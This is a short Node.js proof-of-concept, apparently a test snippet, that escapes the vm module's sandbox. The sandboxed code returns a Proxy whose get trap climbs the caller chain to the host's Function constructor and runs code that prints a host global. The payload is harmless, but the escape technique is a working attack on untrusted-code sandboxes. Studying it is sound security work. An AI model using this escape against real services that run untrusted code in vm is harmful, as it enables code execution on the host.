vm = require('vm');
sauce = "laser";

const code4 = `new Proxy({}, {
    get: function(me, key) { (arguments.callee.caller.constructor('console.log(sauce)'))() }
})`;
  
console.log("In this part it tries to read vm result and escape with laser in log")
data = vm.runInContext(code4, vm.createContext(Object.create(null)));
if (data['some_key']) {
  
}